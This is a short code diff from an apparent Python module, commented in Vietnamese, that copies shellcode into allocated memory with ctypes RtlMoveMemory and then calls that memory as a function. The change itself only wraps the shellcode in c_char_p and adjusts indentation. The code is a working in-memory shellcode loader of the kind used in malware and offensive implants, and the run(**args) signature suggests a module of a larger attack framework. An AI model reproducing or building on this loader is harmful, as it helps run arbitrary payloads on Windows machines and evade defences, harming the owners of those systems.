@@ -26,10 +26,11 @@ def run(**args):
 
         # 🧪 Copy shellcode vào vùng nhớ đó
         ctypes.windll.kernel32.RtlMoveMemory(
-            ctypes.c_void_p(ptr),
-            shellcode,
-            size
-        )
+	    ctypes.c_void_p(ptr),
+	    ctypes.c_char_p(shellcode),
+	    size
+	)
+
 
         # 🔥 Gọi shellcode như một hàm
         shell_func = ctypes.CFUNCTYPE(None)(ptr)
